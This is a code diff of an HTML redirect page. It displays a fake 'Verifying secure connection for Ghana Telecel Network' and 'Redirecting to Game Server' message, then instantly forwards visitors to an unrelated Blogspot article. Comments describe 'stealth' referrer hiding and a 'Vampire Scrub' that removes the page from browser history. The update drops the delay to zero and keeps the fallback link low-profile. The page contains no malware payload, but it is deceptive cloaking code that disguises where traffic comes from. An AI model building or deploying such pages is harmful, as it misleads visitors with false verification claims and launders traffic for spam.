@@ -2,61 +2,39 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Verification</title>
     
-    <!-- STEALTH: No-Referrer Policy -->
+    <!-- 3. No-Referrer Policy: Maximizes security by hiding where the user came from -->
     <meta name="referrer" content="no-referrer">
-    
-    <title>Connecting...</title>
 
     <style>
-        /* Reset & Layout */
-        * {
-            box-sizing: border-box;
+        body {
+            background-color: #121212; /* Dark Mode */
+            color: #ffffff;
             margin: 0;
             padding: 0;
-        }
-
-        body {
-            background-color: #121212; /* Dark Mode Background */
-            color: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             height: 100vh;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             text-align: center;
-            overflow: hidden;
         }
 
-        /* --- Green Loading Spinner --- */
         .spinner-container {
-            position: relative;
-            width: 60px;
-            height: 60px;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
         }
 
-        .spinner {
-            width: 100%;
-            height: 100%;
-            border: 4px solid rgba(0, 255, 0, 0.1); /* Faint green background */
-            border-top: 4px solid #00ff00; /* Bright Green */
+        /* High-quality Green CSS Spinner */
+        .loader {
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-top: 5px solid #00d26a; /* Professional Green */
             border-radius: 50%;
+            width: 50px;
+            height: 50px;
             animation: spin 1s linear infinite;
-        }
-
-        /* Inner glowing dot for effect */
-        .spinner::after {
-            content: '';
-            position: absolute;
-            top: 4px;
-            left: 4px;
-            right: 4px;
-            bottom: 4px;
-            border-radius: 50%;
-            background: radial-gradient(circle, rgba(0,255,0,0.2) 0%, rgba(18,18,18,0) 70%);
         }
 
         @keyframes spin {
@@ -64,71 +42,65 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* --- Text Styles --- */
         .status-text {
-            font-size: 16px;
+            font-size: 1.1rem;
             font-weight: 500;
             color: #e0e0e0;
             margin-bottom: 8px;
-            letter-spacing: 0.5px;
-            animation: fadeIn 1s ease-in;
         }
 
         .sub-status {
-            font-size: 13px;
+            font-size: 0.9rem;
             color: #888;
-            margin-bottom: 40px;
         }
 
-        /* --- Fallback Link (Hidden/Invisible but accessible if JS fails) --- */
-        .fallback-link {
-            font-size: 12px;
-            color: #444; /* Very dark, barely visible against #121212 */
+        /* Fallback Link Styling */
+        .fallback {
+            margin-top: 30px;
+            color: #00d26a;
             text-decoration: underline;
-            cursor: pointer;
-            transition: color 0.3s;
-        }
-        
-        .fallback-link:hover {
-            color: #00ff00;
+            font-size: 0.9rem;
+            opacity: 0.5; /* Keeps it hidden/low profile but functional */
+            transition: opacity 0.3s;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
+        .fallback:hover {
+            opacity: 1;
         }
     </style>
 </head>
 <body>
 
+    <!-- 1. Visual Design -->
     <div class="spinner-container">
-        <div class="spinner"></div>
+        <div class="loader"></div>
     </div>
 
     <div class="status-text">Verifying secure connection for Ghana Telecel Network...</div>
     <div class="sub-status">Redirecting to Game Server...</div>
 
-    <!-- Fallback Link (Works without JS or if user waits too long) -->
-    <a href="https://purestem.blogspot.com" class="fallback-link" id="manualLink">If you are not redirected in 5 seconds, click here.</a>
+    <!-- 3. Fallback Mechanism (Hidden functionality) -->
+    <a id="manual-redirect" href="https://purestem.blogspot.com/2026/01/is-ant-man-2026-good-for-your-brain.html" class="fallback">
+        If you are not redirected in 0 seconds, click here.
+    </a>
 
     <script>
         // --- CONFIGURATION ---
-        // The destination URL (The Blogspot Bridge)
-        const destinationUrl = "https://purestem.blogspot.com";
+        const destinationUrl = "https://purestem.blogspot.com/2026/01/is-ant-man-2026-good-for-your-brain.html";
 
         // --- REDIRECTION LOGIC ---
-        document.addEventListener("DOMContentLoaded", function() {
-            
-            // Set a timeout for 2.5 seconds (2500 milliseconds)
-            setTimeout(function() {
-                
-                // METHOD: The Vampire Scrub
-                // Using .replace() removes the current page from the history stack.
-                // This means if the user presses "Back", they won't come back to this filter page;
-                // they will go back to the site before it. This effectively scrubs the referrer.
-                document.location.replace(destinationUrl);
+        // The Vampire Scrub: 
+        // 1. Timeout 0 = Speed of light (executes immediately after DOM parse)
+        // 2. .replace() = Removes history and scrubs referrer
+        // 3. Immediate Trigger on Click as backup
+        setTimeout(function() {
+            document.location.replace(destinationUrl);
+        }, 0);
 
-            }, 2500);
+        // 3. Fallback: In case JS fails, clicking the text/link manually triggers it
+        document.getElementById('manual-redirect').addEventListener('click', function(e) {
+            e.preventDefault();
+            document.location.replace(destinationUrl);
         });
     </script>
 
